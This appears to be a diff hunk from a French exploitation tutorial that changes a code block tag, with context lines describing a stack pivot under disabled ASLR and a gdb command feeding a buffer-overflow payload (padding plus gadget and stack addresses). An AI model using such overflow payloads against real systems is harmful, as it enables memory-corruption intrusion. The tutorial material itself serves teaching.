@@ -511,7 +511,7 @@ Le dernier est parfait car l'ASLR étant désactivé on peut fixer `esp` à l'ad
 
 Il suffit de placer l'adresse du gadget suivi de la nouvelle adresse dans notre payload pour obtenir notre stack pivot :
 
-```shell-session
+```console
 (gdb) r `python -c 'print "A"*504 + "\x30\x99\xe2\xb7\x0c\xf3\xff\xbf"'`
 ```
 
